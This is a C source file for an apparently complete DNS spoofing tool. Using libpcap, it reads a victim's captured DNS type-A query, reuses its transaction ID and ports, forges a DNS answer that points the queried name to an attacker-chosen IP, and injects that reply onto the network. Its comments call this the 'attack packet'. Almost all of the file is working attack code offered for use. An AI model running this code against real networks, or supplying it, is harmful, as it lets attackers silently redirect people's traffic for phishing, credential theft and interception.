//#include <windows.h>
#include <stdio.h>
#include <pcap.h>

#include "DNSHijack.h"
#include "PacketCrafter.h"
#include "NetProtocols.h"



/*
 *
 *
 */
void InjectDNSPacket(unsigned char * pRawPacket, pcap_t *lDeviceHandle, char *pSpoofedIP, char *pSourceIP, char *pDestIP)
{
  unsigned char *lDNSPacket = NULL;
  int lPacketsize = 0;  
  int lEtherPacketSize = sizeof(ETHDR);
  int lIPPacketSize = sizeof(IPHDR);
  int lUDPPacketSize = sizeof(UDPHDR);
  int lDNSPacketSize = sizeof(DNS_BASIC) + sizeof(DNS_QUERY) + sizeof(DNS_ANSWER);
  unsigned short lDstPort = 0;
  unsigned short lSrcPort = 0;
  PETHDR lEthrHdr = (PETHDR) pRawPacket;
  PIPHDR lIPHdr = NULL;
  PUDPHDR lUDPHdr = NULL;
  PUDPHDR lUDPHdr2 = NULL;
  PDNS_BASIC lDNSBasicHdr = NULL;
  PDNS_QUERY lDNSQueryHdr = NULL;
  PDNS_BASIC lDNSAnswerHdr = NULL;
  IPADDRESS saddr, daddr;
  unsigned long lULTmp = 0;
  unsigned short lTransactionID = 0;
  int lCounter = 0;
  unsigned char *lDNSURLA = NULL;
  unsigned char *lDNSURL = NULL;

  unsigned char lBinDestIP[BIN_IP_LEN];
  unsigned char lBinSrcIP[BIN_IP_LEN];

  // copy destination and source MAC addresses
  CopyMemory(lBinDestIP , lEthrHdr->ether_dhost, BIN_MAC_LEN);	
  CopyMemory(lBinSrcIP , lEthrHdr->ether_shost, BIN_MAC_LEN);

  lUDPHdr2 = (PUDPHDR) (pRawPacket + lEtherPacketSize + lIPPacketSize);

  // copy src(client) and dest(dns server) port
  lDstPort = ntohs(lUDPHdr2->sport);	// client's port=attack pkt's dest port
  lSrcPort = ntohs(lUDPHdr2->dport);	// dns server's port (53)=attack pkt's src port


printf("InjectDNSPacket() : %s/%s/%s\n", pSpoofedIP, pSourceIP, pDestIP);	



  lDNSBasicHdr = (PDNS_BASIC)(pRawPacket + lEtherPacketSize + lIPPacketSize+ lUDPPacketSize);
	
  //copy the transaction id 
  lTransactionID = lDNSBasicHdr->trans_id;
  lDNSURL = (unsigned char *) (pRawPacket + lEtherPacketSize + lIPPacketSize+ lUDPPacketSize + sizeof(DNS_BASIC));
	
  if ((lDNSURLA = (unsigned char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_BUF_SIZE*2)) == NULL)
    goto END;

	
  for(lCounter = 0; lDNSURL[lCounter] != 0; lCounter++)
    lDNSURLA[lCounter] = lDNSURL[lCounter];

  lDNSURLA[lCounter] = 0;
  lCounter++;

  //set up the incoming packet, and check if it's a DNS types A query
  lDNSQueryHdr = (PDNS_QUERY) (pRawPacket + sizeof(ETHDR) + sizeof(IPHDR) + sizeof(UDPHDR) + sizeof(DNS_BASIC) + (lCounter) );
	
  //return if it's not type A
  if(lDNSQueryHdr->q_type != htons(0x0001))
    goto END;

  //obtain the total attack packet size
  lPacketsize = lCounter + lEtherPacketSize + lIPPacketSize+ lUDPPacketSize + lDNSPacketSize;	

  //allocate memory for the packet		
  if((lDNSPacket = (unsigned char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lPacketsize+1)) == NULL)  
  {
    printf("Error in Malloc\n");
    goto END;
  }

  ZeroMemory((char *) lDNSPacket, lPacketsize);	

  // initialize the packet
  // copy the IP addr over
  lULTmp = inet_addr((const char *) pDestIP);
  CopyMemory(&saddr, &lULTmp, sizeof(lULTmp));
  lULTmp = inet_addr((const char *) pSourceIP);
  CopyMemory(&daddr, &lULTmp, sizeof(lULTmp));


	
  // generate ethernet header for lDNSPacket
  GenerateEtherPacket(lDNSPacket,  (unsigned char *) lBinDestIP,  (unsigned char *) lBinSrcIP);
	
  // generate IP header for lDNSPacket
  lIPHdr = (PIPHDR)(lDNSPacket + lEtherPacketSize);
  GenerateIPPacket((unsigned char *) lIPHdr, IPPROTO_UDP, saddr, daddr, lPacketsize);

  // generate UDP header for lDNSPacket
  lUDPHdr = (PUDPHDR)((unsigned char *) lIPHdr + lIPPacketSize);
  GenerateUDPPacket((unsigned char *) lUDPHdr, lPacketsize, lSrcPort, lDstPort);
	
  // generate DNS header for lDNSPacket
  lDNSAnswerHdr = (PDNS_BASIC) ((unsigned char *) lUDPHdr + lUDPPacketSize);
  GenerateDNSPacket((unsigned char *) lDNSAnswerHdr, lCounter, lDNSURL, lTransactionID, pSpoofedIP);

  //keep sending the crafted dns reply packet to client till max 5 times if not successful
  for (lCounter = 5; lCounter > 0; lCounter--) 
  {
    if (pcap_sendpacket(lDeviceHandle, (unsigned char *) lDNSPacket, lPacketsize) != 0)
      printf("  Error sending the packet\n");
    else 
    {
      printf("  Spoofed DNS response packet sent!\n");
      break;
    }
  }

END:

  if (lDNSPacket != NULL)
    HeapFree(GetProcessHeap(), 0, lDNSPacket);

  if (lDNSURLA != NULL)
    HeapFree(GetProcessHeap(), 0, lDNSURLA);
}



/*
 *
 *
 */
void GenerateEtherPacket(unsigned char * pPacket, unsigned char * pDest, unsigned char * pSource)
{
  PETHDR lEthrHdr = (PETHDR) pPacket;
  int lCounter;

  
  // handle the MAC of source and destination of packet
  for (lCounter = 0; lCounter < BIN_MAC_LEN; lCounter++)	
    lEthrHdr->ether_dhost[lCounter] = pSource[lCounter];

  for (lCounter = 0; lCounter < BIN_MAC_LEN; lCounter++)	
    lEthrHdr->ether_shost[lCounter] = pDest[lCounter];
	  
  lEthrHdr->ether_type = htons(0x0800);  //type of ethernet header
}



/*
 *
 *
 */
void GenerateIPPacket(unsigned char *pPacket, unsigned char pIPProtocol, IPADDRESS pSaddr, IPADDRESS pDaddr, unsigned short pDNSPacketSize)
{
  PIPHDR lIPHdr = (PIPHDR) pPacket;

  //fill up fields in ip header 
  lIPHdr->ver_ihl = 0x45;	//version of IP header = 4
  lIPHdr->tos = 0x00;		//type of service
  pDNSPacketSize = pDNSPacketSize - sizeof(ETHDR);
  lIPHdr->tlen = htons(pDNSPacketSize); //length of packet
  lIPHdr->identification = htons(GetCurrentProcessId()); //packet identification=process ID
  lIPHdr->flags_fo = htons(0x0000);//fragment offset field and u16_flags
  lIPHdr->ttl = 0x3a; 	//time to live  
  lIPHdr->proto = pIPProtocol; //protocol;
  lIPHdr->saddr = pSaddr;	//source IP address = dns server
  lIPHdr->daddr = pDaddr;	//destination IP address = client
  lIPHdr->crc = (unsigned short) in_cksum((unsigned short *) lIPHdr, sizeof(IPHDR));//check_sum
}



/*
 *
 *
 */
void GenerateDNSPacket(unsigned char * pPacket, unsigned short pDNSHdrLength, unsigned char * pDNSURLA, unsigned short lTransactionID, char *pSpoofedIP)
{
  PDNS_BASIC lDNSBasidHdr = (PDNS_BASIC) pPacket;
  PDNS_QUERY lDNSQueryHdr = NULL;
  PDNS_ANSWER lDNSAnswerHdr = NULL;
  char *lDNSUrl = NULL;
  struct in_addr lSpoofedIPAddr;


  //
  lSpoofedIPAddr.s_addr = inet_addr(pSpoofedIP);

  //setting up the basic structure of a DNS packet
  lDNSBasidHdr->trans_id = lTransactionID;
  lDNSBasidHdr->flags = htons(0x8180);
  lDNSBasidHdr->ans = htons(0x0001);
  lDNSBasidHdr->ques = htons(0x0001);
  lDNSBasidHdr->add = htons(0x0000);
  lDNSBasidHdr->auth = htons(0x0000);

  //copy the URL over
  lDNSUrl = (char *) (pPacket + sizeof(DNS_BASIC));

  ZeroMemory((char *) lDNSUrl, pDNSHdrLength);
  CopyMemory(lDNSUrl, pDNSURLA, pDNSHdrLength);

  //setting up the query structure of a DNS packet
  lDNSQueryHdr = (PDNS_QUERY) (pPacket + sizeof(DNS_BASIC) + pDNSHdrLength) ;	
  lDNSQueryHdr->q_class = htons(0x0001);
  lDNSQueryHdr->q_type = htons(0x0001);

  //setting up the answer structure of a DNS packet
  lDNSAnswerHdr = (PDNS_ANSWER) (pPacket + sizeof(DNS_BASIC) + pDNSHdrLength + sizeof(DNS_QUERY)) ;	
  lDNSAnswerHdr->a_url = htons(0xc00c);   // URL in question
  lDNSAnswerHdr->a_type = htons(0x0001);  // type of query
  lDNSAnswerHdr->a_class = htons(0x0001); // class of query->class IN
  lDNSAnswerHdr->a_ttl1 = htons(0x0000);
  lDNSAnswerHdr->a_ttl2 = htons(0x003a);  // time to live (4bytes)=0000003a=58s
  lDNSAnswerHdr->a_len = htons(0x0004);   // Length of resource data length=length of Type A reply =4 bytes IP address
  lDNSAnswerHdr->a_ip = lSpoofedIPAddr;   //user-specified IP
}




/*
 *
 *
 */
void GenerateUDPPacket(unsigned char * pPacket, unsigned short pUDPPacketLength, unsigned short pSrcPort, unsigned short pDstPort)
{
  PUDPHDR lUDPHdr = (PUDPHDR) pPacket;
	
//fill up fields in UDP header
  lUDPHdr->sport = htons(pSrcPort);	// source port of attack_packet
  lUDPHdr->dport = htons(pDstPort);	// destination port of attack_packet
  pUDPPacketLength = pUDPPacketLength - sizeof(IPHDR) - sizeof(ETHDR);
  lUDPHdr->ulen = htons(pUDPPacketLength);		// length
  lUDPHdr->sum = 0;
}




/*
 *
 *
 */
unsigned short in_cksum(unsigned short * pAddr, int pLength)
{
  register int lSum = 0;
  unsigned short lCheckSum = 0;
  register unsigned short *w = pAddr;
  register int lNumLeft = pLength;

  // using a 32 bit accumulator (sum), u16_add sequential 16 bit words to it, and at the end, fold back all the
  // carry bits from the top 16 bits into the lower 16 bits.
  while (lNumLeft > 1)  
  {
    lSum += *w++;
    lNumLeft -= 2;
  }

  //handle odd byte
  if (lNumLeft == 1) 
  {
    *(unsigned char *) (&lCheckSum) = *(unsigned char *) w;
    lSum += lCheckSum;
  }

  // u16_add back carry outs from top 16 bits to low 16 bits 
  lSum = (lSum >> 16) + (lSum & 0xffff);     // u16_add high 16 to low 16 
  lSum += (lSum >> 16);                      // u16_add carry 
  lCheckSum = ~lSum;                         // truncate to 16 bits

  return(lCheckSum);
}